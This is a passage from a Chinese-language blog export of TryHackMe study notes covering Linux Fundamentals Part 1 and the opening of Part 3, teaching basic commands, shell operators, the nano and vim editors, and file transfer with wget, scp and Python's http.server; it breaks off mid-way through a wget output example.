    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/linuxfundamentalspart1" >https://tryhackme.com/room/linuxfundamentalspart1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：踏上学习 Linux 基础知识的旅程，学习在交互式终端上运行一些最基本的Linux命令。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>欢迎来到“Linux 基础”系列的第一部分。你很可能使用的是 Windows 或 Mac 机器，这两者在视觉设计和操作方式上都有很多不同，就像 Windows、iOS 和 MacOS 一样，Linux只是另一种操作系统，也是世界上最流行的操作系统之一，Linux系统正在为智能汽车、安卓设备、超级计算机、家用电器、企业服务器等提供动力。</p>
<p>本文将为你提供以下Linux基础内容：</p>
<ul>
<li>在交互式Linux机器中运行你的第一个命令</li>
<li>介绍一些用于与文件系统交互的基本Linux命令</li>
<li>向你介绍用户和组如何在Linux上工作（以及这对渗透测试人员意味着什么）</li>
</ul>
<h2 id="Linux的一些背景知识"><a href="#Linux的一些背景知识" class="headerlink" title="Linux的一些背景知识"></a>Linux的一些背景知识</h2><p><strong>Linux在哪里使用?</strong></p>
<p>相比于Windows系统，Linux操作系统要轻量级得多，你会惊讶地发现，你每天都有机会以某种形式使用Linux系统，Linux能够支持以下功能：</p>
<ul>
<li><p>用于搭建用户访问的网站</p>
</li>
<li><p>用于车载娱乐信息系统和相关控制面板</p>
</li>
<li><p>销售点(PoS-Point of Sale)系统，如商店的收银台</p>
</li>
<li><p>关键基础设施，如交通灯控制器或工业传感器</p>
</li>
</ul>
<p><strong>Linux的特色</strong></p>
<p>“Linux”这个名字实际上是基于UNIX(另一种操作系统)的多个操作系统的总称，由于UNIX是开源的，所以Linux的变体也各种各样——操作系统的不同用途催生出了不同的Linux变体。</p>
<p>例如，Ubuntu和Debian是比较常见的Linux发行版，Linux的可扩展非常强，也就是说，你可以把Ubuntu作为服务器(比如网站和web应用程序)运行，也可以把它作为一个成熟的个人操作系统运行。在本文中，我们将使用Ubuntu系统进行练习。</p>
<p>tips：Ubuntu服务器可以在只有512MB内存的系统上运行。</p>
<p>tips：类似于不同版本的Windows(7、8和10)，Linux也有许多不同的版本以及发行版。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402214844561.png"
                      alt="image-20230402214844561"
                ></p>
<h2 id="运行简单的Linux命令"><a href="#运行简单的Linux命令" class="headerlink" title="运行简单的Linux命令"></a>运行简单的Linux命令</h2><p>正如我们之前所讨论的那样，使用 Ubuntu 等Linux操作系统的关键原因是由于Linux操作系统的轻量级，但是，这并非意味着Linux并非没有缺点，例如，如果我们没有为Linux系统安装GUI，那么在Linux操作系统中通常就没有 GUI（图形用户界面，能提供与机器交互的桌面环境）可供我们使用。</p>
<p>如果我们想要与没有GUI的Linux操作系统发生交互，我们就必须通过“终端”来完成（即使系统安装了GUI，还是免不了依赖于“终端”来和Linux系统进行交互）。</p>
<p>“终端”是纯粹基于文本的，Linux操作系统的“终端”（Terminal）界面类似于下图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402220603219.png"
                      alt="image-20230402220603219"
                ></p>
<p>我们可以通过终端命令来实现一些基本的操作，如导航到文件、输出文件内容以及创建文件等，这些命令的含义有时候是不言自明的。</p>
<p>让我们先了解以下两个基本命令：</p>
<ul>
<li><code>echo</code>：输出我们所提供的任何文本内容；</li>
<li><code>whoami</code>：显示我们当前登录的用户名。</li>
</ul>
<p>以下是相关命令的示例：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402221322991.png"
                      alt="image-20230402221322991"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402221333903.png"
                      alt="image-20230402221333903"
                ></p>
<p><strong>答题</strong></p>
<p>使用和本文相关的实验房间所提供的Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402221632147.png"
                      alt="image-20230402221632147"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402221505119.png"
                      alt="image-20230402221505119"
                ></p>
<h2 id="使用Linux命令与文件系统交互"><a href="#使用Linux命令与文件系统交互" class="headerlink" title="使用Linux命令与文件系统交互"></a>使用Linux命令与文件系统交互</h2><p>我们只介绍了“ echo”和“ whoami”命令，这还不能帮助我们实现导航到文件系统、读取文件内容以及写入内容到文件等操作；所以我们还需要学习更多的命令。</p>
<p><strong>与文件系统交互</strong></p>
<p>如前所述，能够在不依赖桌面环境的情况下浏览所登录的Linux机器是非常重要的，我们可以使用以下命令：</p>
<ul>
<li><code>ls</code>：该命令的全名是“listing”；</li>
<li><code>cd</code>：该命令的全名是“change directory”；</li>
<li><code>cat</code>：该命令的全名是“concatenate”；</li>
<li><code>pwd</code>：该命令的全名是“print working directory”。</li>
</ul>
<p>tips：上述四个命令是不言自明的，我们可以从上面四个命令的全名中猜测出各个命令的用途。</p>
<p><strong>列出当前目录中的文件(ls)</strong></p>
<p>在我们查找任何文件或文件夹的内容之前，我们需要知道Linux机器的当前目录下存在什么，我们可以使用<code>ls</code>命令(ls是listing的缩写)来列出当前目录中的文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402225034052.png"
                      alt="image-20230402225034052"
                ></p>
<p>在上面的截图中，我们可以看到当前有以下目录&#x2F;文件夹：</p>
<ul>
<li>Important Files</li>
<li>My Documents</li>
<li>Notes</li>
<li>Pictures</li>
</ul>
<p>根据以上文件夹的名称，你可能会猜测到这些文件夹将包含什么内容。</p>
<p>tips：你可以直接列出某个目录(文件夹)下的内容，而无需事先导航到对应目录，如使用<code>ls Pictures</code>命令将直接列出Pictures目录下的内容。</p>
<p><strong>更改当前目录(cd)</strong></p>
<p>现在我们知道当前目录下存在哪些文件夹，我们可以使用<code>cd</code>命令(change directory的简称)来切换到对应目录中；例如，如果我们想打开“Pictures”目录，就可以执行<code>cd Pictures</code>命令来切换目录，然后再使用<code>ls</code>命令——即可列出“Pictures”目录下的内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402230130734.png"
                      alt="image-20230402230130734"
                ></p>
<p>如上图所示，在Pictures目录下有四个jpg图像文件。</p>
<p><strong>查看文件内容(cat)</strong></p>
<p>当我们知道文件的存在之后，我们还可能想要查看文件的具体内容，此时我们可以使用<code>cat</code>命令，该命令可以简单地查看文本文件(或其他文件)的内容。</p>
<p>“<code>cat</code>”是concatating的缩写，该命令可用于输出文件的具体内容(不仅仅是文本文件)。</p>
<p>在下面的截图中，我们可以看到如何使用<code>ls</code>和<code>cat</code>来查看“Documents”目录下的文件具体内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402230319216.png"
                      alt="image-20230402230319216"
                ></p>
<p>让我们来分析一下上图内容：</p>
<ol>
<li>我们首先使用了<code>ls</code>命令，这让我们知道这台机器的“Documents”文件夹中有哪些文件可用，如上图中的“todo.txt”文件；</li>
<li>然后，我们使用<code>cat todo.txt</code>命令来输出这个“todo.txt”文件的内容，随后显示的内容为“Here’s something important for me to do later!”</li>
</ol>
<p>tips：我们也可以使用<code>cat /home/ubuntu/Documents/todo.txt</code>命令直接输出目标文本文件的内容。</p>
<p>用户名、密码、配置设置等敏感信息有时候也可能会存储在文件中，因此，我们可以尝试使用<code>cat</code>命令来查看一些可能包含敏感信息的文件的具体内容。</p>
<p><strong>查找当前工作目录的完整路径(pwd)</strong></p>
<p>在你使用终端浏览Linux机器的过程中，你当前的工作目录名称可以通过终端提示符得知；但是我们很容易忘记我们当前在文件系统中的确切位置（即当前工作目录的完整路径），这时我们就可以使用<code>pwd</code>命令来进行查看，<code>pwd</code>表示打印工作目录的完整路径（<strong>p</strong>rint <strong>w</strong>orking <strong>d</strong>irectory）。</p>
<p>假设我们目前在“Documents”文件夹中——但是该文件夹在Linux机器文件系统的哪个具体位置呢?</p>
<p>我们可以使用<code>pwd</code>命令进行查看，如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402223817265.png"
                      alt="image-20230402223817265"
                ></p>
<p>让我们来分析一下上图内容：</p>
<ol>
<li>根据当前的终端提示符，我们已经知道我们在“Documents”目录中，假设我们不知道“Documents”在系统中的具体位置。</li>
<li>我们可以使用<code>pwd</code>(打印工作目录)命令找到这个“Documents”文件夹的完整路径。</li>
<li>在输入<code>pwd</code>命令之后，Linux会告诉我们这个“Documents”目录存储在当前机器上的“&#x2F;home&#x2F;ubuntu&#x2F;Documents”路径。</li>
<li>现在，如果我们发现自己在其他目录中，我们就可以使用<code>cd /home/ubuntu/Documents</code>将当前工作目录重新更改为“Documents”目录。</li>
</ol>
<p><strong>答题</strong></p>
<p>使用和本文相关的实验房间所提供的Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402224702955.png"
                      alt="image-20230402224702955"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230402224506668.png"
                      alt="image-20230402224506668"
                ></p>
<h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2><p>Linux的一个可取之处是使用它可能会帮助我们提高工作效率，话虽如此，你的效率当然取决于你对Linux命令的熟悉程度；随着时间的推移，当你习惯与操作系统(如Ubuntu)进行交互时，那些常用的Linux命令将开始变成你的肌肉记忆。</p>
<p>在Linux终端界面中，我们可以使用一组命令来快速搜索用户（在整个系统中）可以访问的文件，而不只是一直使用<code>cd</code>和<code>ls</code>来查找文件位置。</p>
<p><strong>使用“find”命令</strong></p>
<p>find命令既可以非常简单地使用，也可以和其他参数或命令组合使用，这取决于你具体想要做什么。</p>
<p>假设我们可以看到如下的一个可用目录列表：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403080111411.png"
                      alt="image-20230403080111411"
                ></p>
<ol>
<li>Desktop</li>
<li>Documents</li>
<li>Pictures</li>
<li>folder1</li>
</ol>
<p>一个目录可以包含更多的目录或文件，当我们为了寻找特定的文件而不得不查看每一个目录时，这就变得令人头疼了，所以我们可以使用find命令来简化上述过程。</p>
<p>假设我们已经知道我们正在寻找的文件的名称-但我们不知道它的确切位置，比如，我们想找到”password.txt”文件。</p>
<p>如果我们已经知道文件名，我们就可以简单地使用<code>find -name password .txt</code>命令，这将在当前目录下的每个文件夹中查找指定的文件，如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403080529617.png"
                      alt="image-20230403080529617"
                ></p>
<p>如上图所示，find命令已经设法找到目标文件——相关路径是folder1&#x2F;passwords.txt；但是，如果我们不知道文件的具体名称或者想要搜索每个具有相同扩展名(如“.txt”)的文件，我们应该怎么做？</p>
<p>我们可以简单地使用通配符(<code>*</code>)来搜索任何以“.txt”（或者其他扩展名）结尾的文件和目录。</p>
<p>假设我们希望找到当前目录中的每个.txt文件，我们就可以构造<code>find -name *.txt</code>命令，这样我们就能够找到当前目录下的每个.txt文件以及它们的具体位置：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403081402271.png"
                      alt="image-20230403081402271"
                ></p>
<p>如上图所示，我们已经成功找到了：</p>
<ol>
<li>位于.&#x2F;folder1目录下的passwords.txt文件；</li>
<li>位于.&#x2F;Document目录下的todo.txt文件。</li>
</ol>
<p><strong>使用“grep”命令</strong></p>
<p>另一个值得学习的实用程序是<code>grep</code>命令的使用，<code>grep</code>命令能够允许我们在文件的内容中搜索我们正在寻找的特定值。</p>
<p>以web服务器的访问日志为例，假设某个web服务器的access.log有244条日志记录。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403082019508.png"
                      alt="image-20230403082019508"
                ></p>
<p>在此处，使用像<code>cat</code>这样的命令并不能很好地解决内容查找问题，例如，如果我们想搜索这个日志文件，以查看某个用户&#x2F;IP地址访问了哪些内容，考虑到我们想要找到一个特定的值，所以用<code>cat</code>命令直接查看这个包含244个条目的日志文件内容并不是那么有效。</p>
<p>我们可以尝试使用<code>grep</code>来搜索一个文件的全部内容，以找到我们想要查找的特定值；以上述的访问日志文件为例，假设我们希望找到IP地址“81.143.211.90”访问过的所有内容(注意，这是虚构的)，我们可以如下操作：使用<code>grep &quot;81.143.211.90&quot; access.log</code>命令。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403082642585.png"
                      alt="image-20230403082642585"
                ></p>
<p>如上图所示，我们已经使用<code>grep</code>命令搜索了access.log文件，然后终端界面向我们显示了一些条目，这些条目都是在access.log日志文件中与目标IP相关的内容。</p>
<p>tips：“grep”的全称为Global search REgular expression and Print out the line（全局搜索正则表达式并打印成行）</p>
<p><strong>答题</strong></p>
<p>使用和本文相关的实验房间所提供的Linux虚拟机进行操作：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;THM&quot; access.log</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403084038773.png"
                      alt="image-20230403084038773"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403084117471.png"
                      alt="image-20230403084117471"
                ></p>
<h2 id="Shell操作符介绍"><a href="#Shell操作符介绍" class="headerlink" title="Shell操作符介绍"></a>Shell操作符介绍</h2><p>学习Linux操作符能够加强你对Linux命令的了解，有一些重要的操作符值得我们注意。</p>
<p>本小节将简单介绍以下几个基础操作符：</p>
<ul>
<li><code>&amp;</code>：此操作符允许你在终端的后台运行命令。</li>
<li><code>&amp;&amp;</code>：此操作符允许你在终端的一行中组合多个命令。</li>
<li><code>&gt;</code>：这个操作符是一个重定向器——这意味着我们可以从命令中获取输出(例如使用cat输出一个文件)并将其定向到其他地方，当我们将输出重定向到一个有内容的文本文件时，原文件的文本内容会被自动覆盖。</li>
<li><code>&gt;&gt;</code>：此操作符执行与<code>&gt;</code>操作符相同的功能，但最终效果是附加输出内容到原文件内容的结尾而不是直接替换(这意味着不会覆盖任何内容)。</li>
</ul>
<p>接下来，让我们简单地介绍一下以上四种操作符。</p>
<p><strong>操作符 “&amp;”</strong></p>
<p>这个操作符允许我们在后台执行命令。</p>
<p>假设我们现在想复制一个大文件，这将花费很长时间，并且在复制文件期间我们无法做任何其他事情；因此，我们可以选择使用”&amp;”操作符将命令后台化，该操作符的作用是允许我们执行一个命令并将其放置在后台，而当命令在后台执行时，我们就可以继续利用终端来做其他事情。</p>
<p><strong>操作符”&amp;&amp;”</strong></p>
<p>我们可以使用”&amp;&amp;”操作符来组合我们要执行的命令列表，并且使用该操作符组合的每个有效命令都会得到执行，例如<code>command1 &amp;&amp; command2</code>，但是要注意的一点是：只有在<code>command1</code>命令执行成功时，<code>command2</code>命令才会随后得到执行。</p>
<p><strong>操作符 “&gt;”</strong></p>
<p>这个操作符就是所谓的重定向器。使用该操作符时，我们可以从命令中获取输出内容，并能将该输出内容发送到其他地方。</p>
<p>一个很好的例子是使用”&gt;”操作符重定向<code>echo</code>命令的输出，假设我们想要创建一个名为，并且要求它的内容为“hey”，我们就可以使用以下命令：<code>echo hey &gt; welcome</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403090231983.png"
                      alt="image-20230403090231983"
                ></p>
<p>tips：如果上图例子中的“welcome”文件本身就有内容，那么使用上述之后，“welcome”文件的原内容将被“hey”所覆盖。</p>
<p><strong>操作符 “&gt;&gt;”</strong></p>
<p>这个操作符其实也是一个输出重定向器，就像我们前面所讨论的操作符(“&gt;”)一样；然而， “&gt;&gt;”操作符的不同之处在于：它不会覆盖原文件中的任何内容，而是会将输出内容附加到原文件内容的最后。</p>
<p>在前面的例子中，我们有一个包含“hey”内容的文件“welcome”，如果我们使用<code>echo</code>命令组合 “&gt;”操作符向文件中添加“hello”，那么“welcome”文件的内容将只有“hello”而没有“hey”（因为使用”&gt;”操作符会覆盖原文件的内容）。</p>
<p>当我们使用 “&gt;&gt;”操作符时，重定向的输出内容将附加到原文件内容的末尾，而不会直接替换（覆盖）原文件的内容：<code>echo hello &gt;&gt; welcome</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403090722301.png"
                      alt="image-20230403090722301"
                ></p>
<p><strong>答题</strong></p>
<p>阅读本小节的内容，并且使用和本文相关的实验房间所提供的Linux虚拟机进行操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403092012788.png"
                      alt="image-20230403092012788"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403092433553.png"
                      alt="image-20230403092433553"
                ></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文所介绍的内容是你在与 Linux 机器交互时将要使用的最基本功能，只要你经常使用这些Linux命令，你将能够很快熟悉这些Linux基础内容。</p>
<p>现在快速回顾一下，本文简单介绍了以下内容：</p>
<ul>
<li>了解关于Linux的一些简单背景知识。</li>
<li>与Linux机器进行简单交互。</li>
<li>运行一些最基本的Linux命令。</li>
<li>介绍如何简单地与Linux中的文件系统进行交互，使用<code>find</code>和<code>grep</code>等命令来更有效地查找目标文件。</li>
<li>通过了解一些 shell 操作符来增强你的命令使用基础。</li>
</ul>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Linux Fundamentals Part3(Linux基础知识3)-学习</title>
    <url>/2024/01/27/THM-Linux%20Fundamentals%20Part3(Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%863)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/linuxfundamentalspart3" >https://tryhackme.com/room/linuxfundamentalspart3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：进一步提升你的Linux使用技能，了解一些Linux系统常见的实用程序。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>欢迎来到“Linux基础”系列的第三部分(也是最后一部分)。到目前为止，在本系列文章中，你已经学习了一些基本概念并使用了一些重要的命令；接下来，本文将展示一些你可能经常会用到的实用工具和应用程序，你还将通过了解Linux中的自动化任务、包管理、服务日志及应用程序日志来提高你的Linux技能。</p>
<p><strong>环境准备</strong></p>
<p>在TryHackMe攻击机或者你的本地Kali机上，使用以下凭据 通过SSH远程访问TryHackMe实验房间所提供的Linux目标机器：</p>
<ul>
<li>IP Address：MACHINE_IP（在与本文相关的TryHackMe实验房间中部署目标机器，即可得到一个对应的目标IP地址）</li>
<li>Username：tryhackme</li>
<li>Password：tryhackme</li>
</ul>
<p>tips：语法示例——<code>ssh tryhackme@MACHINE_IP</code>。</p>
<h2 id="终端文本编辑器"><a href="#终端文本编辑器" class="headerlink" title="终端文本编辑器"></a>终端文本编辑器</h2><p>到目前为止（在本系列的文章中），我们使用过<code>echo</code>命令与操作符(<code>&gt;</code>和<code>&gt;&gt;</code>)的组合，实现了写入文本内容到指定文件中；但是当我们处理具有多行内容的文件时，前述写入方式并不是一种有效的处理数据的方法，此时我们就需要使用文本编辑器来处理文件内容。</p>
<p>有很多文本编辑器可供Linux终端使用，它们都有各种各样的友好性和实用性，接下来我们将简单介绍以下两种终端文本编辑器：</p>
<ul>
<li>nano编辑器</li>
<li>vim编辑器</li>
</ul>
<p><strong>Nano编辑器简介</strong></p>
<p>Nano很容易上手，如果要使用nano创建或编辑文件，我们只需输入<code>nano filename</code>命令（在实际执行时，将”filename”替换为你所希望编辑的文件名即可）。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Introducing Nano 终端界面示例</span></span><br><span class="line">tryhackme@linux3:/tmp# nano myfile</span><br><span class="line">  GNU nano 4.8                                             myfile                                                       </span><br><span class="line"></span><br><span class="line">^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify     ^C Cur Pos     M-U Undo       M-A Mark Text</span><br><span class="line">^X Exit        ^R Read File   ^\ Replace     ^U Paste Text  ^T To Spell    ^_ Go To Line  M-E Redo       M-6 Copy Text</span><br></pre></td></tr></table></figure></div>

<p>一旦我们按下回车键执行nano命令，nano编辑器将会被启动，然后我们就可以开始输入或修改文件的文本内容；我们可以使用“向上”和“向下”方向键浏览文本的每一行，也可以使用键盘上的“Enter”键开始新的一行。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Using Nano to write text 终端界面示例</span></span><br><span class="line">tryhackme@linux3:/tmp# nano myfile</span><br><span class="line">  GNU nano 4.8                                             myfile                                             Modified  </span><br><span class="line"></span><br><span class="line">Hello TryHackMe</span><br><span class="line">I can write things into &quot;myfile&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify     ^C Cur Pos     M-U Undo       M-A Mark Text</span><br><span class="line">^X Exit        ^R Read File   ^\ Replace     ^U Paste Text  ^T To Spell    ^_ Go To Line  M-E Redo       M-6 Copy Text</span><br></pre></td></tr></table></figure></div>

<p>Nano编辑器有一些很容易记住的功能，包括以下内容：</p>
<ul>
<li>搜索文本</li>
<li>复制和粘贴</li>
<li>跳转到某行号对应的行</li>
<li>找出你当前所在行的行号</li>
</ul>
<p>你可以通过按“Ctrl”键(在Linux上会被表示为<code>^</code>)并结合相应的字母来使用nano编辑器的功能；例如，如果我们要退出编辑器界面，我们可以按“Ctrl”+“X”退出Nano编辑器。</p>
<p><strong>VIM编辑器简介</strong></p>
<p>VIM是一个更高级的文本编辑器，虽然你不需要知道VIM的所有高级特性，但是使用VIM编辑器特性 对于提高你的Linux技能有很大帮助。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403214825176.png"
                      alt="image-20230403214825176"
                ></p>
<p>尽管需要更长的时间来熟悉，但是VIM编辑器有很多优点，包括以下内容：</p>
<ul>
<li>可自定义——你可以自主选择修改键盘快捷键；</li>
<li>语法高亮显示——如果你正在编写或维护代码，这可能非常有用，VIM编辑器是软件开发人员的流行选择之一；</li>
<li>VIM编辑器可以在没有安装nano的所有终端上工作（VIM编辑器可以完全替代nano编辑器）；</li>
<li>有很多VIM资源可供你使用，如<a class="link"   href="https://vim.rtorr.com/" >VIM备忘单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、<a class="link"   href="https://www.runoob.com/linux/linux-vim.html" >VIM教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>等。</li>
</ul>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>通过SSH会话对目标Linux虚拟机进行操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403230557870.png"
                      alt="image-20230403230557870"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403230208035.png"
                      alt="image-20230403230208035"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230403230317863.png"
                      alt="image-20230403230317863"
                ></p>
<h2 id="Linux常见实用程序介绍"><a href="#Linux常见实用程序介绍" class="headerlink" title="Linux常见实用程序介绍"></a>Linux常见实用程序介绍</h2><p><strong>下载文件-wget</strong></p>
<p>计算机设备的一个相当基本的特征是具有传输文件的能力，例如，你可能想要从网上下载一个程序、一个脚本或者一张图片。</p>
<p>在本小节我们将介绍<code>wget</code>命令的使用，这个命令允许我们通过HTTP从网络上下载文件——就像你在浏览器中访问文件一样；在使用<code>wget</code>命令下载文件时，我们还需要提供所希望下载的资源的地址，例如，如果我们想下载一个名为“myfile.txt”的文件到本地Linux机器上，假设我们已经知道了目标资源文件的网址，我们所使用的命令看起来会是下面这样：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</span><br></pre></td></tr></table></figure></div>

<p>**传输文件-scp **</p>
<p>SCP（secure copy）是一种能够安全复制文件的方法，与常规的<code>cp</code>复制命令不同，使用<code>scp</code>命令可以在两台计算机之间传输文件，并且该命令将使用SSH协议来提供身份验证和数据加密功能。</p>
<p>基于SOURCE（源）和DESTINATION（目的地），SCP能够允许你：</p>
<ul>
<li>将文件和目录从当前系统中复制到远程系统；</li>
<li>从远程系统中复制文件和目录到当前系统。</li>
</ul>
<p>使用<code>scp</code>命令的前提是：我们已经知道当前的本地系统和远程系统上有效用户的名称及其密码。</p>
<p>接下来我们要将一个示例文件从我们的本地机器复制到远程机器，假设我们已经知道如下信息：</p>
<ul>
<li>远程系统的IP地址——192.168.1.30；</li>
<li>远程系统上的有效用户名称——ubuntu；</li>
<li>本地系统上的文件名——important.txt；</li>
<li>我们希望将文件存储在远程系统上所使用的新文件名称——transferred.txt。</li>
</ul>
<p>有了以上这些信息，我们就可以编写<code>scp</code>命令将文件从本地系统中复制到远程系统：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在本地系统的终端界面输入以下命令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在需要提供密码的时候：请输入密码进行身份验证</span></span><br><span class="line">scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt</span><br></pre></td></tr></table></figure></div>

<p>现在，让我们颠倒过来，让我们使用<code>scp</code>命令从远程计算机上复制文件到本地计算机。</p>
<p>同样，我们需要事先知道以下信息：</p>
<ul>
<li>远程系统的IP地址——192.168.1.30；</li>
<li>远程系统上的有效用户名称——ubuntu；</li>
<li>远程系统上的文件名——documents.txt；</li>
<li>我们希望将文件存储在本地系统上所使用的新文件名称——notes.txt</li>
</ul>
<p>有了以上这些信息，我们就可以编写<code>scp</code>命令从远程系统上复制文件到本地计算机：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在本地系统的终端界面输入以下命令</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在需要提供密码的时候：请输入密码进行身份验证</span></span><br><span class="line">scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt </span><br></pre></td></tr></table></figure></div>

<p><strong>托管文件到web服务器</strong></p>
<p>Ubuntu机器预先打包了python3，而Python能够提供了一个轻量级且易于使用的web模块，称为“HTTPServer”；该模块能够将你的计算机变成一个快捷和简易的web服务器，你可以使用它来托管你本地计算机上的文件，然后就可以通过其他计算机设备使用<code>curl</code>和<code>wget</code>等命令进行文件下载操作。</p>
<p>Python3的“HTTPServer”默认将托管你当前运行命令时所在的目录中的文件，但这可以通过添加在手册页中找到的参数选项来更改。</p>
<p>我们可以直接在本地计算机的终端中运行<code>python3 -m http.server</code>命令以启动“HTTPServer”模块，如下例所示（没有指定端口则会使用8000端口）：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Using Python to start a web server 终端界面示例</span></span><br><span class="line">tryhackme@linux3:/tmp# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure></div>

<p>tips：如果需要指定该简易web服务器所绑定的端口，则可以使用像 <code>python3 -m http.server 1234</code>这样的命令（其中的1234为指定的端口号）。 </p>
<p>现在，我们就可以在其他计算机设备上使用<code>wget</code>并通过指定本地计算机的IP地址和文件名来下载文件。Python3所提供的这个“HTTPServer”模块的一个缺陷是无法编制索引，因此必须知道我们所希望下载的文件的确切名称和位置。</p>
<p>除了Python3所提供的“HTTPServer”模块之外，你还可以使用Updog来托管文件，Updog能提供一个更高级但仍属于轻量级的web服务器以便你托管本地计算机上的文件。</p>
<p>Updog的GitHub项目链接：<a class="link"   href="https://github.com/sc0tfree/updog" >https://github.com/sc0tfree/updog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下面是通过Python3的”HTTPServer”模块下载所托管的文件的示例（承接前面的本地文件托管示例）：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Downloading a file from our webserver using wget 终端界面示例</span></span><br><span class="line">tryhackme@linux3:/tmp# wget http://127.0.0.1:8000/file</span><br><span class="line"></span><br><span class="line">2021-05-04 14:26:16  http://127.0.0.1:8000/file</span><br><span class="line">Connecting to http://127.0.0.1:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 51095 (50K) [text]</span><br><span class="line">Saving to: ‘file’</span><br><span class="line"></span><br><span class="line">file                    100%[=================================================&gt;]  49.90K  --.-KB/s    in 0.04s</span><br><span class="line"></span><br><span class="line">2021-05-04 14:26:16 (1.31 